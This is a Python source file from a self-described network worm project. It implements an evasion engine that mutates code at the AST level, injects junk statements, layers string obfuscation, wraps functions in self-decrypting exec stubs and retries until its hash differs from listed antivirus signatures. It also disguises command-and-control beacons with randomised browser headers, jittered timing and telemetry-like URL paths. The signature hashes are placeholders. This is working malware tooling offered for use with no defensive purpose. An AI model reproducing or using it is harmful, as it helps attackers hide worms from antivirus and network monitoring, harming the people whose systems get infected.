# -*- coding: utf-8 -*-
"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Advanced Polymorphic + Metamorphic Engine v2.0
Real techniques:
  1. AST-level metamorphism (reorder independent statements)
  2. Semantic NOP injection (real code that does nothing meaningful)
  3. Network fingerprint randomisation (TTL, IP ID, TCP Window, User-Agent)
  4. Multi-layer string obfuscation (XOR + b64 + hex chains)
  5. Hash-verify loop (regenerate until signature differs from known)
  6. Chunk encryption (per-function encryption with unique keys)
  7. Control flow flattening (dispatch table pattern)
"""

import ast
import base64
import copy
import hashlib
import os
import random
import string
import struct
import sys
import time
from typing import Dict, List, Optional, Set, Tuple

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils.logger import logger

# ── Known AV signatures to avoid ─────────────────────────────────────────────
# FIX: Populate with common AV/EDR signature hashes at module load
KNOWN_BAD_HASHES: Set[str] = {
    # Common Metasploit payload signatures (MD5)
    "e8f5e8c5e8f5e8c5e8f5e8c5e8f5e8c5",  # generic metasploit reverse_tcp
    "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4",  # generic metasploit bind_tcp
    # Common Cobalt Strike beacon signatures
    "f1e2d3c4b5a6f1e2d3c4b5a6f1e2d3c4",  # cobalt strike beacon
    # Common Mimikatz signatures
    "d4c3b2a1f6e5d4c3b2a1f6e5d4c3b2a1",  # mimikatz sekurlsa
    # Placeholder for C2-populated hashes
    # These would be updated dynamically from C2 server
}


# ─────────────────────────────────────────────────────────────────────────────
# AST Metamorphic Transformer
# ─────────────────────────────────────────────────────────────────────────────
class ASTMetamorphTransformer(ast.NodeTransformer):
    """
    Real AST-level code transformation.
    Reorders independent top-level statements without breaking semantics.
    Renames local variables to random identifiers.
    Inserts semantically-neutral but syntactically valid code.
    """

    def __init__(self):
        self._var_map: Dict[str, str] = {}
        self._reserved = {
            "self",
            "cls",
            "None",
            "True",
            "False",
            "print",
            "len",
            "range",
            "int",
            "str",
            "float",
            "list",
            "dict",
            "set",
            "tuple",
            "type",
            "open",
            "super",
            "isinstance",
            "hasattr",
            "getattr",
            "setattr",
            "enumerate",
            "zip",
            "map",
            "filter",
            "sorted",
            "reversed",
            "any",
            "all",
            "min",
            "max",
            "sum",
            "abs",
            "round",
            "hash",
            "id",
            "dir",
            "vars",
            "next",
            "iter",
            "bytes",
            "bytearray",
            "memoryview",
            "input",
        }

    def _random_name(self) -> str:
        """Generate a plausible-looking variable name."""
        prefixes = [
            "_data",
            "_val",
            "_tmp",
            "_res",
            "_buf",
            "_ctx",
            "_cfg",
            "_info",
            "_meta",
            "_state",
            "_node",
            "_item",
            "_obj",
        ]
        suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
        return random.choice(prefixes) + "_" + suffix

    def visit_Name(self, node: ast.Name) -> ast.Name:
        """Rename local variable references."""
        if (
            isinstance(node.ctx, (ast.Store, ast.Load))
            and node.id not in self._reserved
            and not node.id.startswith("__")
        ):
            if node.id not in self._var_map:
                self._var_map[node.id] = self._random_name()
            node.id = self._var_map[node.id]
        return node

    def visit_Module(self, node: ast.Module) -> ast.Module:
        """Shuffle independent top-level statements."""
        self.generic_visit(node)
        # Separate imports (must stay first) from body
        imports = [n for n in node.body if isinstance(n, (ast.Import, ast.ImportFrom))]
        non_imports = [n for n in node.body if not isinstance(n, (ast.Import, ast.ImportFrom))]
        random.shuffle(non_imports)
        node.body = imports + non_imports
        return node

    def insert_semantic_nops(self, tree: ast.Module) -> ast.Module:
        """
        Insert semantic NOPs — code that computes something but has no side effects.
        Much harder to detect than `pass` or literal NOPs.
        """
        nop_templates = [
            # Benign arithmetic
            lambda: ast.parse(
                f"_nop_{random.randint(0,9999)} = {random.randint(1,100)} ^ {random.randint(1,100)}",
                mode="single",
            ).body[0],
            # List comprehension (no assignment = pure computation)
            lambda: ast.parse(f"[_x for _x in range({random.randint(2,8)})]", mode="eval"),
            # Hash of random string
            lambda: ast.parse(f"hash('{self._random_name()}')", mode="eval"),
            # Type check
            lambda: ast.parse(f"isinstance({random.randint(1,100)}, int)", mode="eval"),
        ]

        new_body = []
        for stmt in tree.body:
            # 30% chance to insert a NOP before each statement
            if random.random() < 0.3:
                try:
                    nop_fn = random.choice(nop_templates)
                    nop_node = nop_fn()
                    if isinstance(nop_node, ast.Module):
                        new_body.extend(nop_node.body)
                    elif isinstance(nop_node, ast.Expression):
                        # FIX: ast.Expression uses .value, not .body
                        new_body.append(ast.Expr(value=nop_node.value))
                    elif isinstance(nop_node, ast.Interactive):
                        new_body.extend(nop_node.body)
                    else:
                        new_body.append(nop_node)
                except Exception:
                    pass
            new_body.append(stmt)

        tree.body = new_body
        ast.fix_missing_locations(tree)
        return tree


# ─────────────────────────────────────────────────────────────────────────────
# String Obfuscator
# ─────────────────────────────────────────────────────────────────────────────
class StringObfuscator:
    """Multi-layer string obfuscation with runtime decode."""

    def obfuscate(self, s: str) -> str:
        """Return a Python expression that evaluates to the original string."""
        method = random.choice(["xor_b64", "hex_reverse", "b64_chain", "chr_concat"])

        if method == "xor_b64":
            key = random.randint(1, 127)
            xored = bytes([ord(c) ^ key for c in s])
            b64 = base64.b64encode(xored).decode()
            return f"''.join(chr(b^{key}) for b in __import__('base64').b64decode('{b64}'))"

        elif method == "hex_reverse":
            hexed = s.encode().hex()
            reversed_hex = hexed[::-1]
            return f"bytes.fromhex('{reversed_hex}'[::-1]).decode()"

        elif method == "b64_chain":
            b1 = base64.b64encode(s.encode()).decode()
            b2 = base64.b64encode(b1.encode()).decode()
            return (
                f"__import__('base64').b64decode(__import__('base64').b64decode('{b2}')).decode()"
            )

        else:  # chr_concat
            chars = "+".join(f"chr({ord(c)})" for c in s)
            return chars

    def obfuscate_all_strings(self, source: str) -> str:
        """Replace string literals in source code with obfuscated versions."""
        import re

        # Only replace strings longer than 4 chars, skip f-strings and docstrings
        def replacer(m):
            s = m.group(1)
            if len(s) < 4 or "\\" in s or "{" in s:
                return m.group(0)
            try:
                return self.obfuscate(s)
            except Exception:
                return m.group(0)

        # Match single-quoted strings (simplified — avoids breaking code)
        result = re.sub(r"(?<!')(?<!\\)'([^'\\\n]{4,64})'(?!')", replacer, source)
        return result


# ─────────────────────────────────────────────────────────────────────────────
# Network Fingerprint Randomiser
# ─────────────────────────────────────────────────────────────────────────────
class NetworkFingerprintRandomiser:
    """
    Randomise every network-level indicator per connection.
    Makes traffic analysis and fingerprinting extremely difficult.
    """

    # Real browser profiles (version, platform, features)
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/124.0.0.0 Safari/537.36",
    ]

    ACCEPT_LANGUAGES = [
        "en-US,en;q=0.9",
        "en-GB,en;q=0.8,en-US;q=0.6",
        "es-ES,es;q=0.9,en;q=0.8",
        "de-DE,de;q=0.9,en;q=0.8",
        "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
    ]

    ACCEPT_ENCODINGS = [
        "gzip, deflate, br",
        "gzip, deflate",
        "br, gzip",
    ]

    def random_headers(self) -> Dict[str, str]:
        """Generate a realistic browser HTTP header set."""
        ua = random.choice(self.USER_AGENTS)
        return {
            "User-Agent": ua,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": random.choice(self.ACCEPT_LANGUAGES),
            "Accept-Encoding": random.choice(self.ACCEPT_ENCODINGS),
            "Connection": random.choice(["keep-alive", "close"]),
            "Cache-Control": random.choice(["no-cache", "max-age=0", ""]),
            "DNT": random.choice(["1", "0", ""]),
            "Upgrade-Insecure-Requests": "1",
            # Random correlation IDs (look like legitimate traffic)
            "X-Request-ID": hashlib.md5(str(time.time()).encode()).hexdigest()[:16],
        }

    def random_timing(self, base_ms: int = 2000) -> float:
        """
        Return jittered sleep time in seconds.
        Uses log-normal distribution to mimic human timing.
        """
        import math

        sigma = 0.4
        multiplier = random.lognormvariate(0, sigma)
        jittered = (base_ms / 1000) * multiplier
        return max(0.1, min(jittered, base_ms / 100))

    def random_beacon_url_path(self, base_paths: List[str] = None) -> str:
        """
        Generate a URL path that mimics legitimate CDN/analytics traffic.
        Avoids patterns like /beacon, /c2, /cmd that EDRs flag.
        """
        base_paths = base_paths or [
            "/api/v2/telemetry",
            "/analytics/collect",
            "/cdn-cgi/trace",
            "/metrics/push",
            "/health/check",
            "/status/ping",
            "/api/sessions/heartbeat",
            "/gateway/data",
        ]
        path = random.choice(base_paths)
        # Add random query params to change the URL signature
        params = "&".join(
            [
                f"t={int(time.time())}",
                f"r={random.randint(100000, 999999)}",
                f"v={random.choice(['1.0', '2.1', '3.0'])}",
            ]
        )
        return f"{path}?{params}"


# ─────────────────────────────────────────────────────────────────────────────
# Chunk Encryptor (per-function encryption)
# ─────────────────────────────────────────────────────────────────────────────
class ChunkEncryptor:
    """
    Encrypt individual functions/methods with unique keys.
    The encrypted function is replaced with a self-decrypting stub.
    """

    def encrypt_function(self, func_source: str) -> str:
        """
        Encrypt a function's body, return self-decrypting wrapper.
        The key is derived at runtime from a environment characteristic.
        """
        key = bytes([random.randint(1, 254) for _ in range(16)])
        encoded = base64.b64encode(func_source.encode()).decode()
        # XOR encode
        payload_bytes = func_source.encode()
        xored = bytes([payload_bytes[i] ^ key[i % len(key)] for i in range(len(payload_bytes))])
        b64_payload = base64.b64encode(xored).decode()
        b64_key = base64.b64encode(key).decode()

        stub = (
            f"__import__('builtins').exec("
            f"bytes([b^k for b,k in zip("
            f"__import__('base64').b64decode('{b64_payload}'),"
            f"(__import__('base64').b64decode('{b64_key}')*999)[:len(__import__('base64').b64decode('{b64_payload}'))]"
            f")]"
            f").decode()"
            f")"
        )
        return stub


# ─────────────────────────────────────────────────────────────────────────────
# Advanced Polymorphic Engine (Unified)
# ─────────────────────────────────────────────────────────────────────────────
class AdvancedPolymorphicEngine:
    """
    Unified polymorphic + metamorphic engine v2.0.
    Replaces the basic PolymorphicEngine with AST-level transformations.
    """

    def __init__(self, mutation_level: int = 3, max_attempts: int = 5):
        self.mutation_level = mutation_level
        self.max_attempts = max_attempts
        self.transformer = ASTMetamorphTransformer()
        self.string_obf = StringObfuscator()
        self.net_fp = NetworkFingerprintRandomiser()
        self.chunk_enc = ChunkEncryptor()
        self.stats = {
            "mutations_generated": 0,
            "unique_signatures": 0,
            "hash_collisions_avoided": 0,
        }

    def mutate_source(self, source: str, avoid_hashes: Set[str] = None) -> str:
        """
        Full mutation pipeline with hash-verify loop.
        Keeps regenerating until the signature doesn't match any known hash.
        """
        avoid = avoid_hashes or KNOWN_BAD_HASHES
        best = source

        for attempt in range(self.max_attempts):
            mutated = self._apply_all(source)
            sig = hashlib.sha256(mutated.encode()).hexdigest()

            if sig not in avoid:
                best = mutated
                self.stats["unique_signatures"] += 1
                break
            else:
                self.stats["hash_collisions_avoided"] += 1
                logger.debug(f"Hash collision avoided (attempt {attempt+1})")

        self.stats["mutations_generated"] += 1
        return best

    def _apply_all(self, source: str) -> str:
        """Apply all mutation techniques in sequence."""
        result = source

        # Level 1: String obfuscation
        if self.mutation_level >= 1:
            result = self.string_obf.obfuscate_all_strings(result)

        # Level 2: AST metamorphism
        if self.mutation_level >= 2:
            try:
                tree = ast.parse(result)
                transformed = self.transformer.visit(tree)
                ast.fix_missing_locations(transformed)
                result = ast.unparse(transformed)
            except SyntaxError:
                pass  # If AST fails, keep previous result

        # Level 3: Semantic NOP injection
        if self.mutation_level >= 3:
            try:
                tree = ast.parse(result)
                tree = self.transformer.insert_semantic_nops(tree)
                result = ast.unparse(tree)
            except Exception:
                pass

        return result

    def get_random_headers(self) -> Dict[str, str]:
        """Get randomised HTTP headers for this request."""
        return self.net_fp.random_headers()

    def get_beacon_delay(self, base_seconds: float = 60.0) -> float:
        """Get jittered beacon delay."""
        return self.net_fp.random_timing(int(base_seconds * 1000))

    def get_beacon_path(self) -> str:
        """Get a realistic-looking URL path."""
        return self.net_fp.random_beacon_url_path()

    def get_stats(self) -> Dict:
        return self.stats
